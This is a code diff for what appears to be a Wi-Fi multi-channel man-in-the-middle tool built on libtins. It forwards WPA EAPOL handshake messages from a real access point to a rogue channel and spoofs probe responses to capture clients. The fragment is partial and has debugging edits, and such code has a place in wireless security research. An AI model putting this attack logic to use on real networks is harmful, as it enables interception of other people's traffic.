@@ -17,11 +17,12 @@ using namespace Tins;
 
 void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
                                  const HWAddress<6> &addr1) {
-    // Beacon — update timestamp
+    // Beacon from real AP — update timestamp
     if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
         const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
         if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel)
             last_real_beacon = steady_clock::now();
+        // return
     }
 
     const bool might_forward = clients.contains(addr1.to_string()) &&
@@ -51,7 +52,24 @@ bool McMitm::is_eapol(const PDU &pdu){
     return pdu.find_pdu<EAPOL>() != nullptr;
 }
 
-bool McMitm::handle_probe_request_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
+bool McMitm::handle_eapol(const HWAddress<6> addr2, const HWAddress<6> addr1, PDU &pdu){
+    const auto *dot11 = pdu.find_pdu<Dot11>();
+    if(dot11->addr1() == ap_mac){
+
+    }else if(addr2 == ap_mac){
+        // EAPOL od AP → forward na rogue channel
+        if(is_eapol(pdu) && clients.contains(addr1.to_string())){
+            int eapol_msg = get_eapol_msg_num(pdu);
+            log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
+            sock_rogue->send(pdu, netconfig.rogue_channel);
+            if(eapol_msg == 4 && only_to_mitm) stop_mitm = true;
+            return true;
+        }
+    }
+    return false;
+}
+
+bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
     if(dot11.find_pdu<Dot11ProbeRequest>()){
         probe_resp->addr1(dot11.find_pdu<Dot11ProbeRequest>()->addr2());
         RadioTap rt;
@@ -61,8 +79,8 @@ bool McMitm::handle_probe_request_real(const HWAddress<6> addr2, const Dot11 &do
         return true;
     }
     if(dot11.find_pdu<Dot11ProbeResponse>()){
-        if(addr2 != ap_mac) print_rx(LogLevel::INFO, "Real channel", dot11);
-        //return true;
+        //if(addr2 == ap_mac) print_rx(LogLevel::INFO, "Real channel", dot11);
+        return true;
     }
     return false;
 }
@@ -90,16 +108,22 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
 
     const HWAddress<6> addr1 = dot11->addr1();
     HWAddress<6> addr2;
-    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>())
+    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>()){
         addr2 = mgmt->addr2();
-    else if(const auto *data = pdu->find_pdu<Dot11Data>())
+    }else if(const auto *data = pdu->find_pdu<Dot11Data>()){
         addr2 = data->addr2();
-    else{
+    }else if(dot11->type() == Dot11::MANAGEMENT){
+        const auto raw = dot11->serialize();
+        if(raw.size() >= 16)
+            addr2 = HWAddress<6>(raw.data() + 10).to_string();
+    }else{
         log(LogLevel::WARNING, "Unknown frame type");
         return;
     }
 
-    if (handle_probe_request_real(addr2, *dot11)) return;
+
+    if (handle_probe_real(addr2, *dot11)) return;
+    //if(handle_eapol(addr2, addr1, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){ // STA -> AP
         if(const auto *auth = dot11->find_pdu<Dot11Authentication>())
@@ -134,8 +158,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
         if(is_eapol(*pdu) && clients.contains(addr1.to_string())){
             int eapol_msg = get_eapol_msg_num(*pdu);
             log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
-            sock_rogue->send(*pdu, netconfig.rogue_channel);
-            if(eapol_msg == 4 && only_to_mitm) stop_mitm = true;
+            if(eapol_msg == 1 || eapol_msg == 3) sock_rogue->send(*pdu, netconfig.rogue_channel);
         }
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
         display_client_traffic(*dot11, "Real channel", "_");
